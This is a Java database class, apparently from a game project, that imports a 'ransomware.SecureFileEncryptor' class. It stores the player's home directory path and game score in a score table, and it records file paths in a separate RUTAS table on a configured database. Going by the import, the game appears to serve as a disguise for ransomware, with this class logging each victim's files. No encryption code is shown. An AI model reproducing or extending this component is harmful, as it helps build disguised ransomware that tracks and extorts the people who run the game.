package database;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Properties;

import ransomware.SecureFileEncryptor;
import states.GameState;

public class dataBase {
	public static Connection conn;
	public static Statement stmt;
	public static ResultSet rs;
	public static String user;
	Properties prop;

	public static void connection(Properties prop) {
		prop = new Properties();
		InputStream is;
		try {
			is = new FileInputStream(new File("resources/bd.properties"));
			prop.load(is);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		

		try {
			String driver = prop.getProperty("driver", "");
			String url = prop.getProperty("url", "");
			String usser = prop.getProperty("usser", "");
			String passwd = prop.getProperty("passwd", "");
			Class.forName(driver).newInstance();
			conn = DriverManager.getConnection(url, usser, passwd);
			stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE, ResultSet.CONCUR_UPDATABLE);
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void insertar(int opc, String path) {
		user = System.getProperty("user.home");
		if (opc == 1) {
			try {
				String sql = "SELECT ID, USERNAME, SCORE, DATE FROM PUNTUACION";

				rs = stmt.executeQuery(sql);

				rs.moveToInsertRow();
				rs.updateString(2, user);
				rs.updateInt(3, GameState.score);
				rs.insertRow();

			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		if (opc == 2) {
			try {
				String sql = "SELECT MAX(ID) AS maxID FROM PUNTUACION";
				rs = stmt.executeQuery(sql);
				rs.next();
				int maxID = rs.getInt("maxID");
				rs.close();
				
				sql = "INSERT INTO RUTAS (ID, PATHFILE) VALUES (?, ?)";
				PreparedStatement pstmt = conn.prepareStatement(sql);
				pstmt.setInt(1, maxID+1);
				pstmt.setString(2, path);
				pstmt.executeUpdate();
				pstmt.close();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	}
}
